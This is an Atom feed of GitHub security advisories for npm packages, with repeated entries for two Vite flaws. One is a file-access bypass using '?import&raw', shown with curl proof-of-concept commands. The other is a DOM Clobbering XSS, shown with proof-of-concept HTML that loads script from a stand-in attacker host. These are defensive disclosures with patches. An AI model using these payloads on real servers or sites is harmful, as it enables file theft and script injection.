<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-09-20T04:01:23.650Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-19T18:34:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45811">https://nvd.nist.gov/vuln/detail/CVE-2024-45811</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite's `server.fs.deny` is bypassed when using `?import&raw`]]></title>
        <id>https://github.com/advisories/GHSA-9cwx-2883-4wfx</id>
        <link href="https://github.com/advisories/GHSA-9cwx-2883-4wfx"/>
        <updated>2024-09-19T18:34:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?import&amp;raw</code> to the URL bypasses this limitation and returns the file content if it exists.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx">https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx</a></li>
<li><a href="https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249">https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249</a></li>
<li><a href="https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34">https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34</a></li>
<li><a href="https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd">https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6">https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6</a></li>
<li><a href="https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7">https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45811">https://nvd.nist.gov/vuln/detail/CVE-2024-45811</a></li>
<li><a href="https://github.com/advisories/GHSA-9cwx-2883-4wfx">https://github.com/advisories/GHSA-9cwx-2883-4wfx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cwx-2883-4wfx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T18:44:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
